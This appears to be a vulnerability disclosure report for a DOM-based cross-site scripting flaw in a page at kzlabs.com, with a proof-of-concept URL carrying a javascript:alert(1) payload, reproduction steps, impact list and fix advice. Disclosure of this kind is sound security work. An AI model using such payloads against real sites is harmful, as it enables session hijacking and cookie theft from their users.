# DOM-Based Cross-Site Scripting (XSS) via `location.search`

## Summary

A DOM-Based Cross-Site Scripting (XSS) vulnerability exists in the application where user-controlled input from `location.search` is processed by client-side JavaScript without proper sanitization.

The payload executes in the browser, resulting in arbitrary JavaScript execution.

---

## Vulnerable Endpoint

```text id="4p9vql"
http://kzlabs.com/69.php
```

---

## Payload Used

```html id="1d3w2s"
javascript:alert(1)
```

---

## Steps to Reproduce

1. Open the following URL in a browser:

   ```text
   http://kzlabs.com/69.php?javascript:alert(1)
   ```

2. Observe that the JavaScript payload executes in the browser.

3. Inspect the DOM to confirm that the payload is processed through `location.search`.

---

## Proof of Concept

```text id="owshri"
http://kzlabs.com/69.php?javascript:alert(1)
```
<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/745dcdea-5be6-47f5-b486-88e20e46a01b" />

---

## Impact

* Session hijacking
* Cookie theft
* Arbitrary JavaScript execution
* DOM manipulation attacks

---

## Recommendations for Fix

* Avoid unsafe DOM sinks such as `innerHTML` and `document.write`
* Sanitize and validate `location.search` input
* Use secure DOM APIs like `textContent`
* Implement a strict Content Security Policy (CSP)
